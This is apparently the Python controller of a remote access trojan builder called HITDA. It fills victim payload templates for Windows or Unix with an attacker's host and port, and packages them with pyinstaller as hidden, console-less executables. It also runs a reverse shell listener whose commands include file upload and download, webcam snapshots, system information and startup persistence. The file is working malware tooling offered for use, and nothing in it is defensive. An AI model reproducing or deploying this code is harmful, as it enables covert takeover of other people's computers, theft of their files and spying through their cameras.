import sys
import subprocess
from pyfiglet import figlet_format
import os
import time
import Module.listening as listen


class bcolors:
    PURPLE = '\033[95m'
    BLUE = '\033[94m'
    DARKCYAN = '\033[36m'
    GREEN = '\033[92m'
    OCRA = '\033[93m'
    RED = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


def init():
    print(bcolors.RED + "[*] Starting HitD..." + bcolors.ENDC)
    if not os.path.exists("docker-pyinstaller"):
        print("["+bcolors.OCRA+"+"+bcolors.ENDC+"] Missing docker-pyinstaller, start downloading...")
        s = subprocess.run("git clone https://github.com/cdrx/docker-pyinstaller.git",
                       shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        if b"unable" in s.stderr:
            print(bcolors.RED + "[-] Download fair... Please check your network status" + bcolors.ENDC)
            os._exit(1)
    print(bcolors.GREEN + "[+] Init Success\n" + bcolors.ENDC)
    time.sleep(0.5)



def banner():
    bann = figlet_format(' HITDA', font='starwars')
    print(bcolors.RED + bcolors.BOLD + bann + bcolors.ENDC + bcolors.ENDC)
    print(bcolors.RED + "author: HalukShan" + bcolors.ENDC)


def show_menu():
    menu = " =========================================================\n"
    menu += "||                     " + bcolors.OCRA + "Menu Option" + bcolors.ENDC + "                       ||\n"
    menu += "||                                                       ||\n"
    menu += "|| [" + bcolors.OCRA + "0" + bcolors.ENDC + "] Generate Script                                   ||\n"
    menu += "|| [" + bcolors.OCRA + "1" + bcolors.ENDC + "] Start Listening                                   ||\n"
    menu += "|| [" + bcolors.OCRA + "9" + bcolors.ENDC + "] Exit                                              ||\n"
    menu += " =========================================================\n"

    print(menu)


def select():
    sel = input("> Select Option: ")
    if sel == '0':
        generate_script()
    elif sel == '1':
        start_listening()
    elif sel == '9':
        os._exit(0)
    else:
        print("Wrong Syntax!")
        select()


def tmp_generate(filename, host, port):
    f = open(filename, "r+")
    s = f.read()
    f.seek(0, 0)
    fs = open("tmp.py", "w")
    fs.write(s.replace("$HOST$", host).replace("\"$PORT$\"", port))
    fs.close()
    f.close()


def execute_generate(platform):
    try:
        subprocess.Popen("pyinstaller -F tmp.py --noconsole", shell=True, stdout=subprocess.PIPE).wait()
        if platform == "win":
            # Check the src directory
            if not os.path.exists("docker-pyinstaller/src"):
                os.mkdir("./docker-pyinstaller/src/")
            # Move the generate tmp file to the docker environment
            subprocess.Popen("mv tmp.spec ./docker-pyinstaller/src", shell=True, stdout=subprocess.PIPE).wait()
            subprocess.Popen("mv tmp.py ./docker-pyinstaller/src", shell=True, stdout=subprocess.PIPE).wait()
            os.chdir("docker-pyinstaller/src")
            # Generate the requirements file
            subprocess.Popen("pipreqs ./ --force", shell=True, stdout=subprocess.PIPE).wait()
            subprocess.Popen("docker run -v \"$(pwd):/src/\" cdrx/pyinstaller-windows", shell=True, stdout=subprocess.PIPE).wait()
            print(bcolors.GREEN + "Sucess generate! The exe file path is ./docker-pyinstaller/src/dist/windows/tmp " + bcolors.ENDC)
        else:
            print(bcolors.GREEN + "Sucess generate! The exe file path is ./dist/tmp " + bcolors.ENDC)
    except:
        print(bcolors.RED + "[-] Error. Maybe you are missing some dependencies. "
              "Please check if you have install pyinstaller, docker, or pipreqs."
              "Check if the current path has ./docker-pyinstaller" + bcolors.ENDC)


def generate_script():
    menu = "=========================================================\n"
    menu += "Choose the platform you want to run        \n"
    menu += "[" + bcolors.OCRA + "0" + bcolors.ENDC + "] Generate script running on Windows\n"
    menu += "[" + bcolors.OCRA + "1" + bcolors.ENDC + "] Generate script running on Linux/MacOS system\n"
    menu += "========================================================\n"
    print(menu)
    sel = input("> Select Option: ")
    while True:
        host = input("Please input your listening host: ")
        port = input("Please input your listening port: ")
        confirm = input(f"Your listening host: " + host + ", port: " + port + ", (y/n)")
        if confirm.lower() == "n":
            continue
        else:
            break
    if sel == '0':
        while True:
            option = bcolors.BOLD + "\nGenerate with camera function will make the " \
                                    "filesize increase to about 50M \n\n" + bcolors.ENDC
            option += "[" + bcolors.OCRA + "0" + bcolors.ENDC + "] Generate script with camera snapshot function\n"
            option += "[" + bcolors.OCRA + "1" + bcolors.ENDC + "] Generate script without camera snapshot function\n"
            print(option)
            o = input("> Select Option: ")
            if o == '0':
                tmp_generate("Module/win_victim_cam.py", host, port)
                break
            elif o == '1':
                tmp_generate("Module/win_victim.py", host, port)
                break
            else:
                print(bcolors.RED + "Invalid choice" + bcolors.ENDC)
                time.sleep(0.5)
                continue
        # Start generate
        execute_generate("win")
    elif sel == "1":
        tmp_generate("Module/unix-victim.py", host, port)
        execute_generate("unix")
    else:
        print(bcolors.RED + "Invalid choice" + bcolors.ENDC)
        time.sleep(0.5)
        generate_script()


def start_listening():
    while True:
        host = input("Please input listening host: ")
        port = input("Please input listening port: ")
        confirm = input(f"Your listening host: " + host + ", port: " + port + ", (Y/N)")
        if confirm.lower() == "n":
            continue
        else:
            break
    menu = "=========================================================\n"
    menu += "The Listening mode is base on Reverse Shell        \n"
    menu += "You can use some extra command below \n\n"
    menu += bcolors.GREEN + "sysinfo\n" + bcolors.ENDC
    menu += bcolors.GREEN + "download <remote filename> <local filename>\n" + bcolors.ENDC
    menu += bcolors.GREEN + "upload <local filename> <remote filename>\n" + bcolors.ENDC
    menu += bcolors.GREEN + "webcam_snap <local filename>\n" + bcolors.ENDC
    menu += bcolors.GREEN + "startup  (run the program when system startup)\n" + bcolors.ENDC
    menu += "========================================================\n"
    print(menu)

    l = listen.Listening(host, int(port))
    while 1:
        se = input()
        if se[:4] == "exit":
            break
        elif se[:8] == 'sessions':
            if l.sessions.keys():
                for k in l.sessions.keys():
                    print(bcolors.GREEN + "Session" + k + "open" + bcolors.ENDC)
            else:
                print("No session")
        elif se[:10] == "session -d":
            num = se[11:]
            try:
                l.stop(int(num))
                print("stop session" + num + "sucessful!")
            except:
                print("stop failed!")
        elif se[:10] == "session -t":
            if not l.sessions.keys():
                print("No any session..")
                continue
            try:
                l.stop_all()
                print("stop all sessions sucessful")
            except:
                print("teminate failed!")
        elif se[:7] == "session":
            if l.sessions.keys():
                try:
                    num = se[8:]
                    ses = l.sessions.get(int(num))
                    print("select session " + num)
                    print(ses[2])
                    parent_conn = ses[0]
                    while l.sessions.get(int(num)):
                        cmd = input()
                        if cmd == "background":
                            print(bcolors.OCRA + "session" + num + "background.." + bcolors.ENDC)
                            break
                        else:
                            parent_conn.send(cmd)
                except:
                    print("No such session")
        else:
            print("Usage: sessions : check available sessions\n" +
                  "       session num : open a alive session\n" +
                  "       session [-d] num : delete a session\n" +
                  "       session -t : terminate all sessions\n" +
                  "       exit : back to main menu\n" +
                  "       background (in session) : backgroud session\n"
                  )


if __name__ == '__main__':
    init()
    while 1:
        try:
            banner()
            show_menu()
            select()
        except KeyboardInterrupt:
            print("\nExit...")
            break
